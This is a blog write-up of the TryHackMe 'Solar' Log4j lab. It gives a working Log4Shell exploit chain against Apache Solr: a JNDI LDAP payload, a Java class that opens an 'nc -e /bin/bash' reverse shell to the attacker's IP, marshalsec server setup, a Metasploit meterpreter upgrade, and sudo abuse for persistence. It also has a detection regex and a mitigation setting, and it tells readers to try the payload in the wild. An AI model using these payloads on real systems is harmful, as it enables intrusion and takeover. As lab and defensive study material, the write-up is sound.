<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Try Hack Me - Solar Log4j | Hakune Blog</title>
<meta name=keywords content="cve,ctf,thm,english">
<meta name=description content="Writeup for Try Hack Me&rsquo;s Solar Log4j room">
<meta name=author content="Aki Hakune">
<link rel=canonical href=https://git-akihakune.github.io/blog/solarlog4j>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<link rel=preload href=/static/banner.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico>
<link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.90.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><link rel=manifest href=/hakune.webmanifest>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F8M24PKNWZ',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Try Hack Me - Solar Log4j">
<meta property="og:description" content="Writeup for Try Hack Me&rsquo;s Solar Log4j room">
<meta property="og:type" content="article">
<meta property="og:url" content="https://git-akihakune.github.io/blog/solarlog4j/">
<meta property="og:image" content="https://git-akihakune.github.io/img/solarlog4j/log4shell-logo.png"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2022-01-06T20:27:50+07:00">
<meta property="article:modified_time" content="2022-01-06T20:27:50+07:00"><meta property="og:site_name" content="Hakune Blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://git-akihakune.github.io/img/solarlog4j/log4shell-logo.png">
<meta name=twitter:title content="Try Hack Me - Solar Log4j">
<meta name=twitter:description content="Writeup for Try Hack Me&rsquo;s Solar Log4j room">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Try Hack Me - Solar Log4j","item":"https://git-akihakune.github.io/blog/solarlog4j/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Try Hack Me - Solar Log4j","name":"Try Hack Me - Solar Log4j","description":"Writeup for Try Hack Me\u0026rsquo;s Solar Log4j room","keywords":["cve","ctf","thm","english"],"articleBody":" Here‚Äôs the challenge: https://tryhackme.com/room/solar It‚Äôs recommended to go through this informative room yourself first   Introduction People in the infosec industry all know how far-reached and critical the log4j vulnerability is, given the past exhausted, unrest December.\nTo summarize it all by memes, it would be this:\nAnd this:\nAnd more of these hilarious, evocative memes in this blog post. :D\nWell in short:\n This (in)famous exploit targeting a RCE vulnerability in log4j, a widely used Java library You can find a list of popular affected softwares here: https://github.com/YfryTchsGD/Log4jAttackSurface Check out this clear showcase and explanation from John Hammond, this room‚Äôs creator: https://youtu.be/7qoPDq41xhQ If you simply want to jump right into testing it, here‚Äôs a tool you may want: https://log4shell.huntress.com/  Equipped with all these knowledge, let‚Äôs dive into our challenge! :D\nReconnaissance Here‚Äôs the initial nmap scan:\n# Nmap 7.92 scan initiated Wed Jan 5 08:08:50 2022 as: nmap -sC -sV -oN nmap.txt 10.10.78.2 Nmap scan report for 10.10.78.2 Host is up (0.49s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA) | 256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA) |_ 256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 5 08:10:05 2022 -- 1 IP address (1 host up) scanned in 75.23 seconds Let‚Äôs check out the first question! (Ôº†Ôºæ‚ó°Ôºæ)\n‚Ä¶ Well, time to hammer the machine, then. (‚äô_‚äô)\n$ rustscan -a 10.10.145.200 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\  }/ /\\  \\| |\\  | `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-' The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- üòµ https://admin.tryhackme.com [~] The config file is expected to be at \"/home/kali/.rustscan.toml\" [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. Open 10.10.145.200:22 Open 10.10.145.200:111 Open 10.10.145.200:8983 [~] Starting Script(s) [] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\") [~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 21:27 EST Initiating Ping Scan at 21:27 Scanning 10.10.145.200 [2 ports] Completed Ping Scan at 21:27, 0.39s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:27 Completed Parallel DNS resolution of 1 host. at 21:27, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]  Initiating Connect Scan at 21:27 Scanning 10.10.145.200 [3 ports] Discovered open port 22/tcp on 10.10.145.200 Discovered open port 111/tcp on 10.10.145.200 Discovered open port 8983/tcp on 10.10.145.200 Completed Connect Scan at 21:27, 0.39s elapsed (3 total ports) Looks like only those 3 ports are currently opening. Here‚Äôs the result of the last port scan:\n$ nmap -sV -p 8983 10.10.145.200 130 ‚®Ø Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 21:29 EST Nmap scan report for 10.10.145.200 Host is up (0.39s latency). PORT STATE SERVICE VERSION 8983/tcp open http Apache Solr Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds Discovery Navigating to the application, we see this interface:\nThe task also generously provided us a sample Solr log file. You can download it here: solrlogs.zip.\nMost of those files just contain the default Solr banner, but solr.log contains something weird:\n... 2021-12-13 03:48:53.988 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=1 2021-12-13 03:48:54.383 INFO (qtp1083962448-17) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 03:48:54.801 INFO (qtp1083962448-23) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 03:48:55.144 INFO (qtp1083962448-21) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 2021-12-13 04:01:46.718 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:48.672 INFO (qtp1083962448-16) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:49.304 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:50.401 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0 2021-12-13 04:01:53.944 INFO (qtp1083962448-20) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0 ... There‚Äôs an abnormal number of INFO level log entries. They repeatedly request for /admin/cores endpoint, and some contains unique id field in params entrypoint. Here‚Äôs the result if you try to interact with it:\n$ curl http://10.10.145.200:8983/solr/admin/cores { \"responseHeader\":{ \"status\":0, \"QTime\":0}, \"initFailures\":{}, \"status\":{}} And a few more times:\n$ curl -X POST http://10.10.145.200:8983/solr/admin/cores { \"responseHeader\":{ \"status\":0, \"QTime\":0}, \"initFailures\":{}, \"status\":{}} $ curl -X POST -d \"id=1337\" http://10.10.145.200:8983/solr/admin/cores { \"responseHeader\":{ \"status\":0, \"QTime\":3}, \"initFailures\":{}, \"status\":{}} We can see a slight change in the response: QTime changed, which probably means our posted data was recorded, or ‚Äúlogged‚Äù. Now it‚Äôs time to check if this machine is vulnerable to log4j.\nProof of concept As you may have known, the payload that set the Internet on fire is as simple as:\n${jndi:ldap://EVIL_HOST_ADDRESS} Find your address by ip a, open a netcat listener, then send your payload:\n$ curl -X POST -d '${jndi:ldap://10.4.35.200:9999}' http://10.10.145.200:8983/solr/admin/cores { \"responseHeader\":{ \"status\":0, \"QTime\":0}, \"initFailures\":{}, \"status\":{}} $ nc -lvnp 9999 listening on [any] 9999 ... connect to [10.4.35.200] from (UNKNOWN) [10.10.145.200] 36400 As you can see, the server readily sent back a request - it‚Äôs confirmed being vulnerable to log4j! With this simple procedure you can now go exploit log4j in the wild, just put the payload in whatever you can think of - username, User Agent, request parameters, ‚Ä¶, finger cross and hopefully a thousand-dollar bug bounty will fall upon you. :D\nExploitation This step called for some set up and installation, so it‚Äôs better to power off our attacking machine and take a snapshot first.\nIf you‚Äôre already in an ‚Äúattacking environment‚Äù, like ParrotSec or Kali Linux, chances are required dependencies are already installed. You can run the commands below to automate the installing process.\n#!/bin/bash  cd /tmp sudo apt install default-jdk git maven git clone https://github.com/mbechler/marshalsec cd marshalsec mvn clean package -DskipTests Then, create a simple Java reverse shell through netcat like this:\npublic class Exploit { /img/solarlog4j { try { java.lang.Runtime.getRuntime().exec(\"nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999\"); } catch (Exception e) { e.printStackTrace(); } } } And then, spin up a LDAP server, a simple HTTP server, build the exploit, and open a netcat listener to wait for it.\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit\" python3 -m http.server javac Exploit.java -source 8 -target 8 nc -lnvp 9999 With all that set up, the last task is to send our exploit.\ncurl -X POST -d '${jndi:ldap://10.4.35.200:1389/Exploit}' http://10.10.132.117:8983/solr/admin/cores And‚Ä¶ we got a reverse shell :D\n   If you want to go ‚Äúfurther and beyond‚Äù, there‚Äôs a small optional challenge: Challenge‚Ä¶ accepted. :D\nI recommend this tutorial. Straight to the point, if you want to get a meterpreter instead of an usual unstable reverse shell, just catch it with Metasploit multi/handler and directly upgrade it.\nmsf6 exploit(multi/handler)  exploit [*] Started reverse TCP handler on 10.4.35.200:9999 [*] Command shell session 1 opened (10.4.35.200:9999 - 10.10.178.136:60342 ) at 2022-01-06 05:53:05 -0500 ^Z Background session 1? [y/N] y msf6 exploit(multi/handler)  sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell sparc/bsd 10.4.35.200:9999 - 10.10.178.136:60342 (10.10.178.136) msf6 exploit(multi/handler)  sessions -u 1 [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1] [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.4.35.200:4433 [*] Command stager progress: 100.00% (773/773 bytes) [*] Sending stage (984904 bytes) to 10.10.178.136 [*] Meterpreter session 2 opened (10.4.35.200:4433 - 10.10.178.136:38424 ) at 2022-01-06 05:54:23 -0500 [*] Stopping exploit/multi/handler msf6 exploit(multi/handler)  sessions -i 2 [*] Starting interaction with 2... meterpreter  Persistence As you may have noticed from the video above, this solr user can run sudo without password.\nmeterpreter  shell Process 1794 created. Channel 2 created. sudo -l Matching Defaults entries for solr on solar: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User solr may run the following commands on solar: (ALL) NOPASSWD: ALL This saved us from the hassle of dropping a backdoor ourselves. Now, let‚Äôs change the SSH password and lordly SSH in like a boss. „Éæ(‚åê‚ñ†_‚ñ†)„Éé‚ô™\nDetection This section is dedicated to sysadmins, but if you own an Internet-exposing server, you‚Äôll definitely want to check this useful massive Reddit thread out.\nChecking the affected log file again, we can see our payload proudly stood there:\nsolr@solar:/var/solr/logs$ tail -n 1 solr.log 2022-01-06 10:52:55.930 INFO (qtp1083962448-18) [ ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={${jndi:ldap://10.4.35.200:1389/Exploit\\}=} status=0 QTime=2399 And here‚Äôs the most beautiful but terrifying detection on the Internet:\n(?im)(?:^|[\\n]).*?(?:[\\x24]|%(?:25%?)*24|\\\\u?0*(?:44|24))(?:[\\x7b]|%(?:25%?)*7b|\\\\u?0*(?:7b|173))[^\\n]*?((?:j|%(?:25%?)*(?:4a|6a)|\\\\u?0*(?:112|6a|4a|152))[^\\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))[^\\n]*?((?:l|%(?:25%?)*(?:4c|6c)|\\\\u?0*(?:154|114|6c|4c))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))(?:[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163)))?|(?:r|%(?:25%?)*(?:52|72)|\\\\u?0*(?:122|72|52|162))[^\\n]*?(?:m|%(?:25%?)*(?:4d|6d)|\\\\u?0*(?:4d|155|115|6d))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))|(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:[^\\n]*?(?:[i\\x{130}\\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\\\u?0*(?:111|69|49|151|130|460|131|461))){2}[^\\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\\\u?0*(?:6f|4f|157|117))[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))|(?:c|%(?:25%?)*(?:43|63)|\\\\u?0*(?:143|103|63|43))[^\\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\\\u?0*(?:6f|4f|157|117))[^\\n]*?(?:r|%(?:25%?)*(?:52|72)|\\\\u?0*(?:122|72|52|162))[^\\n]*?(?:b|%(?:25%?)*(?:42|62)|\\\\u?0*(?:102|62|42|142))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))|(?:n|%(?:25%?)*(?:4e|6e)|\\\\u?0*(?:4e|156|116|6e))[^\\n]*?(?:d|%(?:25%?)*(?:44|64)|\\\\u?0*(?:44|144|104|64))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))|(?:h|%(?:25%?)*(?:48|68)|\\\\u?0*(?:110|68|48|150))(?:[^\\n]*?(?:t|%(?:25%?)*(?:54|74)|\\\\u?0*(?:124|74|54|164))){2}[^\\n]*?(?:p|%(?:25%?)*(?:50|70)|\\\\u?0*(?:70|50|160|120))(?:[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163)))?)[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))|(?:b|%(?:25%?)*(?:42|62)|\\\\u?0*(?:102|62|42|142))[^\\n]*?(?:a|%(?:25%?)*(?:41|61)|\\\\u?0*(?:101|61|41|141))[^\\n]*?(?:[s\\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\\\u?0*(?:17f|123|577|73|53|163))[^\\n]*?(?:e|%(?:25%?)*(?:45|65)|\\\\u?0*(?:45|145|105|65))[^\\n]*?(?:[\\x3a]|%(?:25%?)*3a|\\\\u?0*(?:72|3a))(JH[s-v]|[\\x2b\\x2f-9A-Za-z][CSiy]R7|[\\x2b\\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\\x2b\\x2f-9w-z])) Bypasses Here‚Äôs a bunch of bypasses for real life scenarios. You can also search for more exhaustive lists on Github.\nMitigation Let‚Äôs patch the machine by changing its configuration.\nsolr@solar:/var/solr/logs$ find / -type f -name \"solr.in.sh\" 2/dev/null /etc/default/solr.in.sh We just need to add this line to the /etc/default/solr.in.sh file:\nSOLR_OPTS=\"$SOLR_OPTS-Dlog4j2.formatMsgNoLookups=true\" Then restart the service. Sending the exact same payload, we can see it doesn‚Äôt work anymore.\nAnswers What service is running on port 8983? (Just the name of the software) Apache Solr\nTake a close look at the first page visible when navigating to http://MACHINE_IP:8983. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page? /var/solr/logs\nOne file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed) solr.log\nWhat \"path\" or URL endpoint is indicated in these repeated entries? /admin/cores\nViewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name) params\nWhat is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections) Listening on 0.0.0.0:1389\nWhat user are you? solr\nWhat is the full path of the specific solr.in.sh file? /etc/default/solr.in.sh\nFinal words And that‚Äôs an overview about the severe vulnerability that ‚Äúaffect almost all software under the sun‚Äù.\n‚Ä¶ Why are you still here? It‚Äôs high time patching your servers, isn‚Äôt it? \n","wordCount":"1760","inLanguage":"en","image":"https://git-akihakune.github.io/img/solarlog4j/log4shell-logo.png","datePublished":"2022-01-06T20:27:50+07:00","dateModified":"2022-01-06T20:27:50+07:00","author":[{"@type":"Person","name":"Aki Hakune"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/solarlog4j/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)">
<img src=/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://git-akihakune.github.io/archive/ title=archive>
<span>archive</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/blog/ title=blog>
<span>blog</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/>
<span>search</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/tags/ title=tags>
<span>tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;¬ª&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div>
<h1 class=post-title>
Try Hack Me - Solar Log4j
</h1>
<div class=post-meta><span title="2022-01-06 20:27:50 +0700 +07">January 6, 2022</span>&nbsp;¬∑&nbsp;9 min&nbsp;¬∑&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/ rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/solarlog4j/log4shell-logo.png alt="Log4shell vuln logo">
<p>Log4shell vuln logo</p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#introduction aria-label=Introduction>Introduction</a></li>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a></li>
<li>
<a href=#discovery aria-label=Discovery>Discovery</a></li>
<li>
<a href=#proof-of-concept aria-label="Proof of concept">Proof of concept</a></li>
<li>
<a href=#exploitation aria-label=Exploitation>Exploitation</a></li>
<li>
<a href=#persistence aria-label=Persistence>Persistence</a></li>
<li>
<a href=#detection aria-label=Detection>Detection</a></li>
<li>
<a href=#bypasses aria-label=Bypasses>Bypasses</a></li>
<li>
<a href=#mitigation aria-label=Mitigation>Mitigation</a></li>
<li>
<a href=#answers aria-label=Answers>Answers</a></li>
<li>
<a href=#final-words aria-label="Final words">Final words</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><ul>
<li>Here&rsquo;s the challenge: <a href=https://tryhackme.com/room/solar>https://tryhackme.com/room/solar</a></li>
<li>It&rsquo;s recommended to go through this informative room yourself first</li>
</ul>
<hr>
<h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
<p>People in the infosec industry all know how far-reached and critical the <code>log4j</code> vulnerability is, given the past exhausted, unrest December.</p>
<p>To summarize it all by memes, it would be this:</p>
<p><img loading=lazy src=/img/solarlog4j/log4j-holiday-meme.jpg#center alt>
</p>
<p>And this:</p>
<p><img loading=lazy src=/img/solarlog4j/log4j-explain-meme.png#center alt>
</p>
<p>And more of these hilarious, evocative memes in <a href=https://blog.devgenius.io/log4shell-as-explained-by-metaphor-and-memes-38de224a2eb7>this blog post</a>. :D</p>
<p>Well in short:</p>
<ul>
<li>This (in)famous exploit targeting a RCE vulnerability in <a href=https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java>log4j</a>, a widely used Java library</li>
<li>You can find a list of popular affected softwares here: <a href=https://github.com/YfryTchsGD/Log4jAttackSurface>https://github.com/YfryTchsGD/Log4jAttackSurface</a></li>
<li>Check out this clear showcase and explanation from <a href=https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw>John Hammond</a>, this room&rsquo;s creator: <a href=https://youtu.be/7qoPDq41xhQ>https://youtu.be/7qoPDq41xhQ</a></li>
<li>If you simply want to jump right into testing it, here&rsquo;s a tool you may want: <a href=https://log4shell.huntress.com/>https://log4shell.huntress.com/</a></li>
</ul>
<p>Equipped with all these knowledge, let&rsquo;s dive into our challenge! :D</p>
<h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<p>Here&rsquo;s the initial <code>nmap</code> scan:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Nmap 7.92 scan initiated Wed Jan  5 08:08:50 2022 as: nmap -sC -sV -oN nmap.txt 10.10.78.2</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.78.2
Host is up <span style=color:#f92672>(</span>0.49s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
111/tcp open  rpcbind 2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   <span style=color:#ae81ff>100000</span>  2,3,4        111/tcp   rpcbind
|   <span style=color:#ae81ff>100000</span>  2,3,4        111/udp   rpcbind
|   <span style=color:#ae81ff>100000</span>  3,4          111/tcp6  rpcbind
|_  <span style=color:#ae81ff>100000</span>  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#75715e># Nmap done at Wed Jan  5 08:10:05 2022 -- 1 IP address (1 host up) scanned in 75.23 seconds</span>
</code></pre></div><p>Let&rsquo;s check out the first question! <code>(Ôº†Ôºæ‚ó°Ôºæ)</code></p>
<p><img loading=lazy src=/img/solarlog4j/first-question.png#center alt>
</p>
<p>&mldr; Well, time to hammer the machine, then. <code>(‚äô_‚äô)</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ rustscan -a 10.10.145.200                                                                                                                                                                                                                 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                                                                                                                      
| <span style=color:#f92672>{}</span>  <span style=color:#f92672>}</span>| <span style=color:#f92672>{</span> <span style=color:#f92672>}</span> |<span style=color:#f92672>{</span> <span style=color:#f92672>{</span>__ <span style=color:#f92672>{</span>_   _<span style=color:#f92672>}{</span> <span style=color:#f92672>{</span>__  /  ___<span style=color:#f92672>}</span> / <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\ </span>|  <span style=color:#e6db74>`</span>| |                                                                                                                                                                                      
